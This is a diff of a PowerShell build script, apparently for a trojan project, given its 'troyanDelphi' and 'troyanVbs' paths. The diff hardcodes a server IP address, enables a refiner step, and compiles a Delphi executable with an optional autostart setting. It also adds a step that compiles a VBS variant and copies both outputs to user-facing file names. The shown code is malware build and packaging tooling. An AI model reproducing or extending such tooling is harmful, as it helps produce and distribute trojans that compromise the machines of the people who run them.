@@ -1,8 +1,8 @@
 param (
     [string]$serverName, [string]$action = "apply"
 )
-#$serverName="185.247.141.76"
-#$action = "exe"
+$serverName="185.247.141.76"
+$action = "exe"
 if ([string]::IsNullOrEmpty($serverName))
 {
     throw "compile.ps1 -serverName argument is null"
@@ -12,7 +12,7 @@ if ([string]::IsNullOrEmpty($serverName))
 #refine
 $scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
 Set-Location -Path $scriptDir
-#& (Join-Path -Path $scriptDir -ChildPath "./compile.refiner.ps1") -serverName $serverName
+& (Join-Path -Path $scriptDir -ChildPath "./compile.refiner.ps1") -serverName $serverName
 
 #currents
 Set-Location -Path $scriptDir
@@ -28,7 +28,6 @@ if ([string]::IsNullOrEmpty($server.rootDir)) {
 #precompile
 & (Join-Path -Path $server.troyanDelphiDir -ChildPath "./precompile.ps1") -serverName $serverName
 
-
 #compile
 $dprOpts = "NO_AUTORUN"
 if ($server.autoStart)
@@ -42,6 +41,11 @@ Set-Location -Path $server.troyanDelphiDir
 Start-Process -FilePath "`"$dcc32Path`"" -ArgumentList $dprArgs -Wait
 Set-Location -Path $scriptDir
 Copy-Item -Path $server.troyanDelphiExe -Destination $server.userDelphiExe -Force
+
+
+#precompileVBS
+& (Join-Path -Path $server.troyanVbsDir -ChildPath "./compile.ps1") -serverName $serverName
+Copy-Item -Path $server.troyanVbsFile -Destination $server.userVbsFile -Force
 
 
 if ($action -eq "apply")
